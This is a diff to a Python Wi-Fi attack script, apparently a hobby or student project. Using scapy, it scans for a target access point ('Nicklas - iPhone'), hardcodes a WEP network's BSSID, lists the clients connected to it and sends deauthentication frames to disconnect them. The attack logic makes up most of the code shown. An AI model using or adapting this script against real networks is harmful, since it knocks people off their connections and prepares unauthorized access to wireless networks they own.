@@ -14,17 +14,20 @@
 
 from scanner import Scanner
 from deauth import deauth
-from scapy.all import Dot11, sniff
+from scapy.all import Dot11Elt, Dot11, sniff
 from get_clients_on_ap import get_clients_on_ap
 
 INTERFACE = "wlan0"
-TIMEOUT = 30
+TIMEOUT = 20
 
 AP_TO_ATTACK = "Nicklas - iPhone"
 
+
+WEP_AP_BSSID = "48:f8:b3:e4:03:04"  # temp
+
 with Scanner(INTERFACE) as scanner:
-    AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
-    # AP_info = scanner.get_ap(timeout=TIMEOUT)
+    # AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
+    AP_info = scanner.get_ap(timeout=TIMEOUT)
     print(AP_info)
     print(scanner.wifis)
     channel = AP_info.Channel[0]
@@ -37,14 +40,16 @@ with Scanner(INTERFACE) as scanner:
 
     def check_deauth(pkt):
         print("Recived package")
-        # elt = pkt[Dot11Elt]
-        # while elt and elt.ID != 0:
-        #    elt = elt.payload[Dot11Elt]
-        # print(elt.info)
+        elt = pkt[Dot11Elt]
+        while elt and elt.ID != 0:
+            elt = elt.payload[Dot11Elt]
+        print(elt.info)
         # if pkt[Dot11].addr1 == BSSID:
         deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)
 
-    client_list = get_clients_on_ap(TIMEOUT, INTERFACE, BSSID)
+    print("Extracting client list for AP: 'bridge'")
+
+    client_list = get_clients_on_ap(TIMEOUT, INTERFACE, WEP_AP_BSSID)
     print(client_list)
 
     # sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt")  # subtype assoc-req")  # start sniffin
